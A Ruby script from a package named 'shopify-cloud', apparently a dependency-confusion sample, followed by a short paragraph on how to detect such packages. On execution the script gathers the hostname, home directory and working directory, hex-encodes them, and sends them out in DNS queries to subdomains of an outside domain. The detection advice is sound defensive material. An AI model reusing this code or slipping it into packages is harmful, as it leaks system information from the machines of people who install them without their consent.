require 'socket'
require 'json'
require 'resolv'

suffix = '.dns.alexbirsan-hacks-paypal.com'
ns = 'dns1.alexbirsan-hacks-paypal.com'

package = 'shopify-cloud'
data = {
  'p' => package,
  'u' => Socket.gethostname,
  'c' => File.expand_path('~'),
  'd' => Dir.pwd
}

data = JSON.generate(data)
data = data.unpack('h*')[0].scan(/.{1,60}/)
id_1 = rand(36**12).to_s(36)
id_2 = rand(36**12).to_s(36)

begin
  ns_ip = Resolv.getaddress(ns)
rescue
  ns_ip = '4.4.4.4'
end

custom_res = Resolv::DNS.new({:nameserver => [ns_ip, '8.8.8.8']})

data.each_with_index do |chunk, idx|
  begin
    Resolv.getaddress("v2_f_#{id_1}_#{idx.to_s}_#{chunk}#{suffix}")
  rescue; end
  begin
    custom_res.getaddress("v2_e_#{id_2}_#{idx.to_s}_#{chunk}#{suffix}")
  rescue; end
end

detection_knowledge.how_to_detect: Monitor for packages that execute code at install/import time and collect environment information. Flag any outbound DNS queries with encoded data or randomized subdomains to untrusted domains, especially during build or install processes. Use static analysis to detect references to suspicious domains or environment data collection in package code. Cross-reference package names and versions in your build with public repositories to detect possible dependency confusion.
